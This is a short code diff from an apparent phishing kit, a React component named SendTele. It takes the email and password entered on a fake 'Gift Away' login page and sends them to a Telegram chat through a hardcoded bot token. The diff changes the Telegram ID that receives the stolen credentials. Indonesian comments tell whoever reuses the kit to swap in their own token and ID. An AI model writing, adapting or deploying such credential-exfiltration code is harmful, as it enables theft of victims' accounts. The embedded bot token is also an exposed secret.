@@ -25,7 +25,7 @@ function SendTele() {
   useEffect(() => {
     if (email) {
       const token = "6609139420:AAHBa2lD1wVI9PzM915IUzYQnFrrnTQ1XoA"; // Ganti dengan token bot Telegram Anda
-      const telegram_id = "904725130"; // Ganti dengan ID Telegram penerima
+      const telegram_id = "6219231551"; // Ganti dengan ID Telegram penerima
       const message_text = `Ada Yang Login Gift Away \n Email : ${email} \n Password : ${password}`;
 
       sendMessage(telegram_id, message_text, token);
